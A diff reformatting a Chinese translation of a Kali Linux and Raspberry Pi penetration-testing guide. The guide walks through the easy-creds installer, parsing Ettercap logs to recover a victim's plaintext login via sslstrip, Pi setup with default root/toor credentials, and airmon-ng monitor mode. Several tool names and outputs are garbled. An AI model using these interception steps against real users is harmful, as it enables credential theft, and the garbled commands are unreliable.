-5. 输入 `sudo ./installer.sh` 运行安装脚本，你将看到主界面：
+5. 输入`sudo ./installer.sh`运行安装脚本，你将看到主界面：
 
-```
+```text
 Version 3.7 - Garden of Your Mind
 Installer
 nPlease choose your OS to install easy-creds
@@ -4991,7 +5177,6 @@ nPlease choose your OS to install easy-creds
 3. Microsoft Windows
 4. Exit
 Choice: _
-
 KALI LINUX
 The quieter you become, the more you are able to hear
 ```
@@ -5000,22 +5185,32 @@ The quieter you become, the more you are able to hear
 
 7. 然后你会被要求选择安装目录，我直接选了默认值：
 
-```
+```text
 Please provide the path you'd like to place the easy-creds folder. [/opt/]
 [+] Installing pre-reqs for Debian/Ubuntu...
-[+] Running 'updateddb'
-[-] cmake is not installed, will attempt to install...
 ```
+
+
+
+[+] Running `updateddb`
+
+[-] cmake is not installed, will attempt to install...
 
 现在程序会检查已安装的进程，并尝试安装和配置 Easy-Credds 需要的许多支持程序：
 
 ```
 [+] Running 'updateddb'
+
 [-] cmake is not installed, will attempt to install...
+
 [+] I found gcc installed on your system
+
 [+] I found g++ installed on your system
+
 [+] I found subversion installed on your system
+
 [+] I found wget installed on your system
+
 [-] libss2-dev is not installed, will attempt to install...
 ```
 
@@ -5023,12 +5218,11 @@ Please provide the path you'd like to place the easy-creds folder. [/opt/]
 
 ```
 [+] The patched freeradius server has been installed
+
 [+] I found asleep installed on your system
+
 [+] I found metasploit installed on your system
-``` (注：此处原文存在大量重复的 OCR 错误文本，已根据指令要求进行清理并仅翻译核心逻辑部分)
-
-
-
+```
 
 下方的截图显示了一个用户通过 iPad 连接到 Windows Live 并尝试登录读取电子邮件：
 
@@ -5036,28 +5230,37 @@ Please provide the path you'd like to place the easy-creds folder. [/opt/]
 
 如你所 Ettercap 隧道屏幕所示，该用户尝试使用用户名“cyberalarms@live.com”和密码“password”登录 Windows live。
 
-- 1. 现在在主菜单中选择选项 4，“数据审查”（Data Review）：
+1. 现在在主菜单中选择选项 4，“数据审查”（Data Review）：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_216_1.png)
 
-- 2. 选择数字 3，“解析 ettercap eci 文件凭据”（Parse ettercap eci file for credentials）：
+2. 选择数字 3，“解析 ettercap eci 文件凭据”（Parse ettercap eci file for credentials）：
 
 ```
 At any time, ctrl+c to cancel and return to the main menu
+
 1. Parse Strip log for credentials
+
 2. Parse dmiff file for credentials
+
 3. Parse aftercap eci file for credentials
+
 4. Parse freeradi attack file for credentials
+
 5. Previous Menu
+
 Choice: 3
 ```
 
-- 3. 复制并粘贴系统向你提供的 Ettercap 路径：
+3. 复制并粘贴系统向你提供的 Ettercap 路径：
 
 ```
 At any time, ctrl+c to cancel and return to the main menu
+
 ettercap logs in current log folder:
+
 /opt/easy-creds/easy-creds-2013-10-09-1228/ettercap2013-10-09-1233.eci
+
 Enter the full path to your aftercap eci log file: /opt/easy-creds/easy-creds-2013-10-09-1228/ettercap2013-10-09-1233.eci
 ```
 
@@ -5067,7 +5270,7 @@ Enter the full path to your aftercap eci log file: /opt/easy-creds/easy-creds-20
 
 在这里你可以看到用户名和密码，以及他们尝试访问的网站。
 
-记住，我们的“受害者”访问了一个 SSL 加密的 HTTPS 网站，登录凭据本应是加密的。但通过使用 Easy Creds，我们能够恢复流量，使用 sslstrip 剥离加密，并以明文查看登录凭据。
+记住，我们的“受害者”访问了一个 SSL 加密的 HTTPS 网站，登录凭据本应是加密的。但通过使用 Easy Creds，我们能够恢复流量，使用 `sslstrip` 剥离加密，并以明文查看登录凭据。
 
 ## 结论
 
@@ -5094,7 +5297,7 @@ Enter the full path to your aftercap eci log file: /opt/easy-creds/easy-creds-20
 
 Kali Linux 是流行的 Backtrack 渗透测试和安全平台的最新版本。它增加了大量的更新和增强，使得 Kali 比以往任何时候都更强大且更易于更新。
 
-> （注意：我偶尔注意到某些程序在 ARM 版本的 Kali 上无法从命令提示符运行。你可能需要从它们的程序目录 /usr/bin 中执行它们。）
+> （注意：我偶尔注意到某些程序在 ARM 版本的 Kali 上无法从命令提示符运行。你可能需要从它们的程序目录 `/usr/bin` 中执行它们。）
 
 树莓派是一种非常廉价的功能性“信用卡”大小的电脑，有两种型号。本文使用的“B”型具有 512 MB RAM、视频输出、网卡、音频接口和双 USB 端口，令人惊讶的是价格仅约为 35 美元。
 
@@ -5116,40 +5319,36 @@ Pi 也不自带所需的 SDHC 内存卡。选择卡时有一个简单的规则�
 
 以下是在 Pi 上安装 Kali Linux 的方法：
 
-- 1. 下载 Kali Raspberry Pi ARM Image。
-- 2. 使用 Win32 Disk Imager 将镜像写入 SD 卡。
-- 3. 将 SD 卡插入树莓派。
-- 4. 打开树莓派电源。
-- 5. 启动系统。
+1. 下载 Kali Raspberry Pi ARM Image。
+2. 使用 Win32 Disk Imager 将镜像写入 SD 卡。
+3. 将 SD 卡插入树莓派。
+4. 打开树莓派电源。
+5. 启动系统。
 
 # 连接到“无头” Pi
 
 操作方法如下：
 
-- 1. 下载 Windows 版 Putty。
-- 2. 运行 Putty 并输入树莓派的 IP 地址。
-- 3. 确保端口输入 22 并选择连接类型为“SSH”。
-- 4. 点击“Open”。
-- 5. 使用 Kali 默认凭据（root/toor）。
+1. 下载 Windows 版 Putty。
+2. 运行 Putty 并输入树莓派的 IP 地址。
+3. 确保端口输入 22 并选择连接类型为“SSH”。
+4. 点击“Open”。
+5. 使用 Kali 默认凭据（`root/toor`）。
 
 # 通过 Putty 远程查看图形程序
 
 好了，你可以通过 Putty 运行任何文本程序，但如果你尝试运行图形程序，它将工作。如果我们使用 Windows 的 X Server Xming，我们可以在远程 Putty 连接上运行 X 程序。
 
-- 1. 只需下载并安装 Xming。
-- 2. 当询问安装哪些组件时，点击“不安装 SSH 客户端”，完成安装。
-- 3. 现在再次打开 Putty，输入树莓派的 IP 地址和端口。
-
-
-
-
+1. 只需下载并安装 Xming。
+2. 当询问安装哪些组件时，点击“不安装 SSH 客户端”，完成安装。
+3. 现在再次打开 Putty，输入树莓派的 IP 地址和端口。
 
 4. 然后，展开左侧 Category 下的 SSH Connection 标签页，然后所示点击 X11
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_223_0.png)
 
-- 5. 启用 X11 转发（forwarding），并在 X display location 处输入“localhost:0”。
-- 6. 继续启动 putty 会话（确保 Xming 正在后台运行）。
+5. 启用 X11 转发（forwarding），并在 X display location 处输入“localhost:0”。
+6. 继续启动 putty 会话（确保 Xming 正在后台运行）。
 
 你现在已经能够通过 SSH 连接远程查看图形化程序了。
 
@@ -5179,73 +5378,107 @@ Pi 也不自带所需的 SDHC 内存卡。选择卡时有一个简单的规则�
 
 注意到一点，如果插入 Wi-Fi 适配器后树莓派没有正常启动，你可能需要重启。
 
-在命令行提示符输入 "ifconfig"，检查你的 Wi-Fi 适配器是否在列表中。它应该显示为 wlan0。如果你没有看到它，输入 "ifconfig wlan0 up"。然后再次运行 "ifconfig"，它就会显示：
+在命令行提示符输入 `ifconfig`，检查你的 Wi-Fi 适配器是否在列表中。它应该显示为 `wlan0`。如果你没有看到它，输入 `ifconfig wlan0 up`。然后再次运行 `ifconfig`，它就会显示：
 
 ```bash
 root@kali# ifconfig wlan0 up
+
 root@kali# ifconfig
+
 eth0
+
   link:ethernet HWaddr:b8:2f
+
   inet addr:192.168.1.135 Bcast:192.168.1.255 Mask:255.255.255.0
+
   inet addr:fe80::1ba2:7ff:fe45bca/64 Scope:link
+
   UP BROADCAST MULTICAST  MTU:1500  Metric:1  frame:0
+
   RX packets:89 errors:0 dropped:0 overruns:0 carrier:0
+
   TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
+
   RX bytes:7943 (7.8 KiB) TX bytes:14104 (13.7 KiB)
 
 lo
+
   wlan0
+
   link:encapLocal Loopback
+
   inet addr:127.0.0.1 Mask:255.0.0.0
+
   UP BROADCAST MULTICAST  MTU:1500  Metric:1  frame:0
+
   RX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   collisions:0 txqueuelen:1000
+
   RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
 
 wlan0
+
   link:encapEthernet HWaddr:b8:2f:d1:b1:37df
+
   UP BROADCAST MULTICAST  MTU:1500  Metric:1  frame:0
+
   RX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   collisions:0 txqueuelen:1000
+
   RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
 ```
 
 接下来，看看我们的无线卡能看到哪些网络：
 
-- 输入 "iwlist wlan0 scanning":
+- 输入 `iwlist wlan0 scanning`:
 
 太棒了，看起来一切运行正常。现在让我们运行一些基础的 Aircrack-NG 工具。
 
 首先，我们需要将无线适配器设置为监听模式（monitoring mode）。这是一种允许我们捕获并查看无线信号的特殊模式。
 
-- 输入 “airmon-ng wlan0 start”
+- 输入 `airmon-ng wlan0 start`
 
 ```bash
 root@kali:-$ airmon-ng start|stop|check --interface [channel or frequency] wlan0
+
 root@kali:-$ airmon-ng start wlan0
 
 发现1 个可能导致问题的进程。
+
 airirdump-ng, airplay-ng 或 airmon-ng 在短段时间后停止工作，
+
 你可能需要杀死（部分）它们！
 
 PID     Name
+
 1482    dhclient
+
 missing btime in /proc/stat
 
 Interface   Chipset                 Driver
+
 wlan0       Atheros AR8271      ath9k 
 
 wlan0
+
   link:encapEthernet HWaddr:b8:2f:d1:b1:37df
+
   UP BROADCAST MULTICAST  MTU:1500  Metric:1  frame:0
+
   RX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+
   collisions:0 txqueuelen:1000
+
   RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
 ```
-
 
 
 
@@ -5364,8 +5597,6 @@ Security Onion 允许你捕获网络流量，然后对其进行分析并在易�
 Security Onion 还能捕获你网络中的 TOR。TOR 是一种匿名协议，通过在全球范围内跳转的加密通信来帮助用户匿名。TOR 可用于善意，但黑客也利用 TOR 来隐藏攻击。
 
 以下是我在受 Security Onion 监控的测试网络中使用 TOR 的原因：
-
-
 
 注意已触发多个“已知 TOR 出口节点流量”警报。
 
